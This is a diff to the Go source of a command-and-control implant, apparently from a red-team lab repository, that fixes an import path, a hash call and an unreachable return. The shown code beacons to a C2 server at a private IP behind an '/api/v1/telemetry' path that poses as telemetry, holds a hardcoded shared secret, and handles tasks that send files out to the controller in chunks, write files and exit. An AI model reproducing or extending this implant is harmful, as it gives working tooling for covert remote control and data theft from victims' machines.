@@ -22,7 +22,7 @@ import (
 
 	_ "embed"
 
-	"https://github.com/edenzafire/Red_Team_Repo/tree/main/03-Initial-Access/Social-Engineering/lab-c2/internal/proto"
+	"lab-c2/internal/proto"
 )
 
 // ============================================================
@@ -32,7 +32,7 @@ import (
 // ============================================================
 
 var (
-	C2_URL = "https://192.168.1.50:443/api/v1/telemetry" // -X main.C2_URL=...
+	C2_URL = "https://192.168.122.58:443/api/v1/telemetry" // -X main.C2_URL=...
 	SECRET = "chave-super-secreta-do-lab"                // -X main.SECRET=...
 	SLEEP  = 15
 )
@@ -126,7 +126,7 @@ func startDownload(taskUID, path string) (string, bool) {
 	total := (int(st.Size()) + proto.CHUNK_SIZE - 1) / proto.CHUNK_SIZE
 	activeDownload = &downloadState{
 		file: f, name: st.Name(), seq: 0, total: total,
-		hash: hex.EncodeToString(h.Sum256()[:]), uid: taskUID,
+		hash: hex.EncodeToString(h.Sum(nil)), uid: taskUID,
 	}
 	return fmt.Sprintf("transferência iniciada: %s (%d bytes, %d chunks)",
 		path, st.Size(), total), true
@@ -195,6 +195,7 @@ func runTask(taskUID, cmd string) (string, bool) {
 		return fmt.Sprintf("gravado: %s (%d bytes)", fields[1], len(currentTaskData)), true
 	case "exit":
 		os.Exit(0)
+        return"", false // inalcançavel -satisfaz o compilador
 	default:
 		return "task desconhecida: " + cmd, false
 	}
